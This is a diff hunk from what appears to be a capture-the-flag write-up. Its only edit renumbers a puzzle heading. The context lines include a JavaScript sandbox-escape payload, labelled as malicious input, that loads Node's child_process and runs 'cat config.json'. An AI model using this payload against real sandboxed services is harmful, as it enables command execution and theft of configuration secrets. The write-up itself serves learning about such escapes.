@@ -523,7 +523,7 @@ malicious input:
 new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json")
 ```
 
-### Day 10: Crypt-o-Math 3.0
+### Day 11: Crypt-o-Math 3.0
 
 We get the following formulas and values:
 
